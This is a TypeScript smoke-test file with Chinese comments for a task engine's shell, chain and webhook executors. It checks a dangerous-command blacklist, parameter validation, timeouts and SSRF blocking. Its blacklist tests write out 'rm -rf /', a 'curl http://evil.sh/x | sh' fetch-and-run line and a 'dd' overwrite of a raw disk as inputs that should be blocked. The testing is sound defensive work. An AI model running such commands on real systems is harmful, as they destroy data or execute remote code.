// r24-a 冒烟：自定义执行体三类执行器 + 参数校验器 + 引擎注册
import { runShellExecutor, runChainExecutor, runWebhookExecutor, validateCustomExecParams, checkShellDanger } from "../src/server/tasks/custom-exec"
import { TASKS, runTask } from "../src/server/tasks/engine"

let pass = 0
let fail = 0
const ok = (name: string, cond: boolean, detail = "") => {
  if (cond) { pass++; console.log(`  ✓ ${name}`) }
  else { fail++; console.log(`  ✗ ${name} ${detail}`) }
}

// 1. 危险命令黑名单
console.log("【1】Shell 危险模式黑名单")
const d1 = checkShellDanger("rm -rf /")
ok("rm -rf / 拦截", d1.dangerous, JSON.stringify(d1.why))
const d2 = checkShellDanger("curl http://evil.sh/x | sh")
ok("curl|sh 拦截", d2.dangerous)
const d3 = checkShellDanger("echo hello && ls -la")
ok("正常命令放行", !d3.dangerous)
const d4 = checkShellDanger("dd if=/dev/zero of=/dev/sda")
ok("dd 写裸设备拦截", d4.dangerous)

// 2. 参数校验器
console.log("【2】参数校验器")
const v1 = validateCustomExecParams("custom_shell", { script: "echo hi" }, "/home/z/my-project/storage")
ok("合法脚本通过", v1.ok, v1.error)
const v2 = validateCustomExecParams("custom_shell", { script: "rm -rf /" }, "/home/z/my-project/storage")
ok("危险脚本拒绝", !v2.ok, v2.error)
const v3 = validateCustomExecParams("custom_shell", { script: "echo x", cwd: "/etc" }, "/home/z/my-project/storage")
ok("cwd 越界拒绝", !v3.ok)
const v4 = validateCustomExecParams("custom_chain", { steps: [] }, "")
ok("空步骤链拒绝", !v4.ok)
const v5 = validateCustomExecParams("custom_chain", { steps: [{ taskType: "session_idle_reclaim" }] }, "")
ok("单步链通过", v5.ok, v5.error)
const v6 = validateCustomExecParams("custom_webhook", { url: "http://127.0.0.1/x" }, "")
ok("回环 URL…（URL 级在 ssrfGuard 运行时拦截，schema 允许）", v6.ok)
const v7 = validateCustomExecParams("session_idle_reclaim", null, "")
ok("非参数化类型透传", v7.ok)

// 3. Shell 执行器真实运行
console.log("【3】Shell 执行器（真实进程）")
const lines: string[] = []
const log = (m: string) => lines.push(m)
const r1 = await runShellExecutor({ script: "echo DY_TEST_OK && echo $FOO && pwd", env: { FOO: "bar123" }, shell: "sh" }, log, 30)
ok("脚本执行成功", !r1.failed && r1.itemsProcessed === 1, JSON.stringify(r1))
ok("stdout 捕获 DY_TEST_OK", r1.output?.includes("DY_TEST_OK") || false, (r1.output || "").slice(0, 100))
ok("环境变量注入生效", r1.output?.includes("bar123") || false)
ok("exit≠0 判失败", (await runShellExecutor({ script: "exit 7" }, log, 10)).failed === true)

// 超时击杀
const t0 = Date.now()
const r2 = await runShellExecutor({ script: "sleep 60" }, log, 2)
ok("超时 2s 强杀（实际 <10s 返回）", r2.failed === true && Date.now() - t0 < 10000, `${Date.now() - t0}ms ${JSON.stringify(r2).slice(0, 80)}`)
ok("超时标记语义", r2.summary.includes("超时"))

// 进程组击杀验证（子进程不残留）
const r3 = await runShellExecutor({ script: "(sleep 300 &); sleep 300" }, log, 1)
ok("进程组级联击杀", r3.failed === true)

// 4. Webhook 执行器（SSRF 防护 + 放行内网配置链路）
console.log("【4】Webhook 执行器")
// 4a. 先清残留配置 → 默认拦截 localhost（SSRF 防护）
import { PrismaClient } from "@prisma/client"
import { ensureConfigLoaded } from "../src/lib/config"
const db = new PrismaClient()
await db.systemConfig.deleteMany({ where: { key: "tasks.webhookAllowPrivate" } })
await ensureConfigLoaded(true) // 进程内缓存以「无此配置」状态加载
let ssrfBlocked = false
try {
  await runWebhookExecutor({ url: "http://localhost:3000/login", method: "GET", timeoutSec: 5 }, log)
} catch (e) {
  ssrfBlocked = e instanceof Error && e.message.includes("内网")
}
ok("SSRF localhost 拦截（默认）", ssrfBlocked)
// 4b. 超管放行内网后 localhost 可调用（打 dev 服务器真实 HTTP）
await db.systemConfig.upsert({
  where: { key: "tasks.webhookAllowPrivate" },
  create: { key: "tasks.webhookAllowPrivate", valueJson: "true", category: "TASKS", valueType: "BOOL", description: "r24 smoke 临时放行" },
  update: { valueJson: "true" },
})
await ensureConfigLoaded(true) // 刷新进程内配置缓存（放行后立即可见）
const r4 = await runWebhookExecutor({ url: "http://localhost:3000/login", method: "GET", timeoutSec: 10 }, log)
ok("放行后 GET /login 2xx 命中默认成功判定", !r4.failed, JSON.stringify(r4).slice(0, 140))
const r4b = await runWebhookExecutor({ url: "http://localhost:3000/login", method: "GET", expectedStatus: 599, timeoutSec: 10 }, log)
ok("期望状态码不命中 → 判失败", r4b.failed === true)
await db.systemConfig.delete({ where: { key: "tasks.webhookAllowPrivate" } }).catch(() => {})
await db.$disconnect()
const r5 = await runWebhookExecutor({ url: "http://127.0.0.1:9/x", method: "GET", timeoutSec: 3 }, log)
  .catch(() => null)
// 注：127.0.0.1 会被 SSRF guard 拦截（未放行态）——预期抛异常
let portFailBlocked = false
try {
  await runWebhookExecutor({ url: "http://192.0.2.1:9/x", method: "GET", timeoutSec: 3 }, log)
} catch {
  portFailBlocked = true // 192.0.2.1 是 TEST-NET（非私网段判断内）→ fetch 连接超时/失败路径
}
ok("不可达地址失败路径（异常/失败二选一）", r5 === null || r5.failed === true || portFailBlocked)

// 5. 链执行器
console.log("【5】链执行器")
const c1 = await runChainExecutor(
  { steps: [{ taskType: "custom_shell", params: { script: "echo chain-step-1" }, label: "打印" }], failFast: true },
  log,
  (t) => TASKS[t]
)
ok("单步链（内嵌 shell）成功", !c1.failed && c1.summary.includes("1/1"), c1.summary)
let nested = false
try {
  await runChainExecutor({ steps: [{ taskType: "custom_chain", params: {} }] }, log, (t) => TASKS[t])
} catch (e) {
  nested = e instanceof Error && e.message.includes("嵌套")
}
ok("嵌套 custom_chain 拒绝", nested)

// 6. 引擎注册表
console.log("【6】引擎注册")
ok("TASKS 注册 custom_shell", typeof TASKS.custom_shell === "function")
ok("TASKS 注册 custom_chain", typeof TASKS.custom_chain === "function")
ok("TASKS 注册 custom_webhook", typeof TASKS.custom_webhook === "function")

console.log(`\n结果：${pass} pass / ${fail} fail`)
process.exit(fail > 0 ? 1 : 0)
